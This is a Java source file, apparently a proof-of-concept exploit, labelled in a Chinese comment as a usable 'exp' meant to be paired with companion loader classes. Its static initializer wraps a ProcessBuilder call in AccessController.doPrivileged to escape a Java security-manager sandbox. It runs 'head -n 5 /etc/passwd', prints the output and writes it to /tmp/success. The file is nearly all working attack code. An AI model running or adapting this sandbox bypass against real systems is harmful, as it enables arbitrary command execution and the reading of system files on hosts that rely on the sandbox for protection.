/*
可使用的exp：需要与ExpBypassLoader/ExpBypassMain合用，需要在JDK 8下编译（因为AccessController在jdk17中废弃了）
*/
package zk_backup_0.configs.conf1;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.security.AccessController;
import java.security.PrivilegedAction;

public class ExpBypassExec {

    public ExpBypassExec() {}

    static {
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                try {
                    String command = "head -n 5 /etc/passwd";
                    ProcessBuilder builder = new ProcessBuilder(command.split("\\s+"));
                    Process process = builder.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line = reader.readLine();
                    String res = "";
                    while (line != null) {
                        res = res + line + "\n";
                        line = reader.readLine();
                    }
                    reader.close();
                    System.out.println(res);
                    new File("/tmp/success").createNewFile();
                    FileOutputStream stream = new FileOutputStream("/tmp/success");
                    stream.write(res.getBytes());
                    return null;
                } catch (Exception e) {
                    e.printStackTrace();
                    return null;
                }
            }
        });
    }
}
